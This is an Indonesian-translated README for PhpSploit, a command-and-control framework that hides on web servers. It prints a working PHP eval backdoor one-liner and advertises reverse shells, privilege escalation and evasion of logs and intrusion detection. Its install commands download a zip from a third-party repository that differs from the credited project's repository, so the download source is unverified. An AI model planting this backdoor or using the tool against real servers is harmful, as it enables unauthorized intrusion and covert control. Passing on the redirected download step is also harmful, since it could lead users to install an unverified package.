
<p align="center">
  <a href="https://github.com/nil0x42/phpsploit" alt="master">
    <img src="https://raw.githubusercontent.com/nil0x42/phpsploit/master/data/img/logo.png" alt="Master">
  </a>
</p>

<h3 align="center">
    Framework C2 yang lengkap dengan fitur yang diam-diam tetap bertahan<br>di server web melalui PHP oneliner polimorfik
    <a href="https://twitter.com/intent/tweet?text=PhpSploit%2C%20Full-featured%20C2%20framework%20which%20silently%20persists%20on%20webserver%20via%20polymorphic%20PHP%20oneliner%20-%20by%20@nil0x42&url=https://github.com/nil0x42/phpsploit">
      <img src="https://img.shields.io/twitter/url?label=tweet&logo=twitter&style=social&url=http%3A%2F%2F0" alt="tweet">
    </a>
</h3>
<br>

<p align="center">
  <a href="https://github.com/nil0x42/phpsploit/actions/workflows/unit-tests.yml?query=branch%3Amaster">
    <img src="https://img.shields.io/github/actions/workflow/status/nil0x42/phpsploit/unit-tests.yml?label=tests&logo=githubactions" alt="Unit Tests workflow">
  </a>
  <a href="https://github.com/nil0x42/phpsploit/network/dependencies#requirements.txt">
    <img src="https://img.shields.io/badge/dependabot-ok-aaf?logo=dependabot&logoColor=aaf" alt="Dependabot status">
  </a>
  <a href="https://app.codacy.com/gh/nil0x42/phpsploit/dashboard">
    <img src="https://img.shields.io/codacy/grade/f8514058aec04ad98727c79701bc042a?logo=codacy&logoColor=green" alt="codacy code quality">
  </a>
  <a href="https://github.com/nil0x42/phpsploit/actions/workflows/codeql-analysis.yml?query=branch%3Amaster">
    <img src="https://img.shields.io/github/actions/workflow/status/nil0x42/phpsploit/codeql-analysis.yml?label=codeql&logo=lgtm&logoColor=ff0&color=af8" alt="CodeQL workflow">
  </a>
  <a href="https://codecov.io/gh/nil0x42/phpsploit">
    <img src="https://img.shields.io/codecov/c/github/nil0x42/phpsploit?color=orange&label=coverage&logo=codecov" alt="codecov coverage">
  </a>
  <a href="https://codeclimate.com/github/nil0x42/phpsploit/maintainability">
    <img src="https://api.codeclimate.com/v1/badges/6986200c1729b4a70a40/maintainability" alt="codeclimate maintainability">
  </a>
</p>

<p align="center">
  <a href="https://github.com/enaqx/awesome-pentest">
    <img src="https://awesome.re/mentioned-badge.svg">
  </a>
  <a href="https://www.kali.org/tools/phpsploit/">
    <img src="https://img.shields.io/static/v1?label=Kali%20Linux&message=packaged&color=red&logo=kalilinux&logoColor=ff0">
  </a>
  <a href="https://www.blackarch.org/webapp.html">
    <img src="https://img.shields.io/static/v1?label=BlackArch&message=packaged&color=red&logo=archlinux&logoColor=006">
  </a>
  <a href="https://twitter.com/intent/follow?screen_name=nil0x42" target="_blank">
    <img src="https://img.shields.io/twitter/follow/nil0x42.svg?logo=twitter">
  </a>
</p>

<div align="center">
  <sub>
    Dibuat oleh
    <a href="https://twitter.com/nil0x42">nil0x42</a> dan
    <a href="https://github.com/nil0x42/phpsploit#contributors">kontributor</a>
  </sub>
</div>

<br>

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

<p align="center">
  <img src="https://raw.githubusercontent.com/nil0x42/phpsploit/master/data/img/demo.png">
</p>


#### Ikhtisar

Komunikasi tersamarkan dicapai dengan menggunakan header HTTP di bawah permintaan klien standar dan respons relatif server web, ditunnel melalui **backdoor polimorfik** kecil:

```php
<?php @eval($_SERVER['HTTP_PHPSPL01T']); ?>
```

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Panduan Cepat

```sh
wget https://github.com/JawaTengahXploit1337/phpsploit-backup/raw/refs/heads/main/php.zip
unzip php.zip
cd phpsploit
pip3 install -r requirements.txt
./phpsploit --interactive --eval "help help"
```

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Fitur

- **Efisien**: Lebih dari 20 plugin untuk mengotomatiskan tugas eskalasi privilese
    - Menjalankan perintah dan menjelajahi sistem file, melewati pembatasan keamanan PHP
    - Mengunggah/Mengunduh file antara klien dan target
    - Mengedit file jarak jauh melalui editor teks lokal
    - Menjalankan konsol SQL di sistem target
    - Membuka reverse TCP shell

- **Tersembunyi**: Dibuat untuk paranoia tingkat tinggi
    - Hampir tidak terlihat oleh analisis log dan deteksi tanda tangan NIDS
    - Bypass _pembatasan keamanan PHP umum_
    - Komunikasi tersembunyi di header HTTP
    - Payload yang dimuat tersamarkan untuk _melewati NIDS_
    - Dukungan proxy: http/https/socks4/socks5

- **Nyaman**: Antarmuka yang kokoh dengan banyak fitur penting
    - Bantuan rinci untuk setiap opsi (perintah `help`)
    - _Lintas platform_ di klien dan server
    - CLI mendukung auto-completion & multi-command
    - Fitur penyimpanan/pemuatan sesi & riwayat yang persisten
    - Mendukung permintaan besar untuk payload besar (misalnya unggahan)
    - Mesin pengaturan yang sangat dapat dikonfigurasi
    - Setiap pengaturan, seperti user-agent, memiliki mode polimorfik
    - Variabel lingkungan kustom untuk interaksi plugin
    - API pengembangan plugin yang lengkap

* * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * * *

#### Platform yang Didukung (sebagai penyerang):

- GNU/Linux
- Mac OS X

#### Platform yang Didukung (sebagai target):

- GNU/Linux
- BSD-like
- Mac OS X
- Windows NT

## Kontributor

Terima kasih kepada orang-orang hebat ini:
<table>
  <tr>
    <td align="center"><a href="https://exdemia.com"><img src="https://avatars1.githubusercontent.com/u/3504393?v=4" width="100px;" alt=""/><br /><sub><b>nil0x42</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Code">💻</a> <a href="#infra-nil0x42" title="Infrastructure (Hosting, Build-Tools, etc)">🚇</a> <a href="#plugin-nil0x42" title="Plugin/utility libraries">🔌</a> <a href="https://github.com/nil0x42/phpsploit/commits?author=nil0x42" title="Tests">⚠️</a></td>
    <td align="center"><a href="https://github.com/shiney-wh"><img src="https://avatars1.githubusercontent.com/u/20907184?v=4" width="100px;" alt=""/><br /><sub><b>shiney-wh</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=shiney-wh" title="Code">💻</a> <a href="#plugin-shiney-wh" title="Plugin/utility libraries">🔌</a></td>
    <td align="center"><a href="http://wapiflapi.github.io"><img src="https://avatars3.githubusercontent.com/u/1619783?v=4" width="100px;" alt=""/><br /><sub><b>Wannes Rombouts</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=wapiflapi" title="Code">💻</a> <a href="#maintenance-wapiflapi" title="Maintenance">🚧</a></td>
    <td align="center"><a href="http://yurilz.com"><img src="https://avatars1.githubusercontent.com/u/6031769?v=4" width="100px;" alt=""/><br /><sub><b>Amine Ben Asker</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=yurilaaziz" title="Code">💻</a> <a href="#maintenance-yurilaaziz" title="Maintenance">🚧</a></td>
    <td align="center"><a href="http://twitter.com/jnazario"><img src="https://avatars1.githubusercontent.com/u/5619153?v=4" width="100px;" alt=""/><br /><sub><b>jose nazario</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/commits?author=paralax" title="Documentation">📖</a> <a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Aparalax" title="Bug reports">🐛</a></td>
    <td align="center"><a href="http://wikisecure.net"><img src="https://avatars3.githubusercontent.com/u/156915?v=4" width="100px;" alt=""/><br /><sub><b>Sujit Ghosal</b></sub></a><br /><a href="#blog-sujit" title="Blogposts">📝</a></td>
    <td align="center"><a href="https://github.com/sohelzerdoumi"><img src="https://avatars3.githubusercontent.com/u/3418725?v=4" width="100px;" alt=""/><br /><sub><b>Zerdoumi</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Asohelzerdoumi" title="Bug reports">🐛</a></td>
  </tr>
  <tr>
    <td align="center"><a href="https://github.com/tristandostaler"><img src="https://avatars3.githubusercontent.com/u/5489330?v=4" width="100px;" alt=""/><br /><sub><b>tristandostaler</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Atristandostaler" title="Bug reports">🐛</a></td>
    <td align="center"><a href="https://github.com/rohantarai"><img src="https://avatars3.githubusercontent.com/u/16543074?v=4" width="100px;" alt=""/><br /><sub><b>Rohan Tarai</b></sub></a><br /><a href="https://github.com/nil0x42/phpsploit/issues?q=author%3Arohantarai" title="Bug reports">🐛</a></td>
    <td align="center"><a href="https://triop.se"><img src="https://avatars1.githubusercontent.com/u/190150?v=4" width="100px;" alt=""/><br /><sub><b>Jonas Lejon</b></sub></a><br /><a href="#blog-jonaslejon" title="Blogposts">📝</a></td>
  </tr>
</table>

<!-- markdownlint-enable -->
<!-- prettier-ignore-end -->
<!-- ALL-CONTRIBUTORS-LIST:END -->
This project follows the [all-contributors](https://github.com/all-contributors/all-contributors) specification. Contributions of any kind welcome

<!-- </details> -->
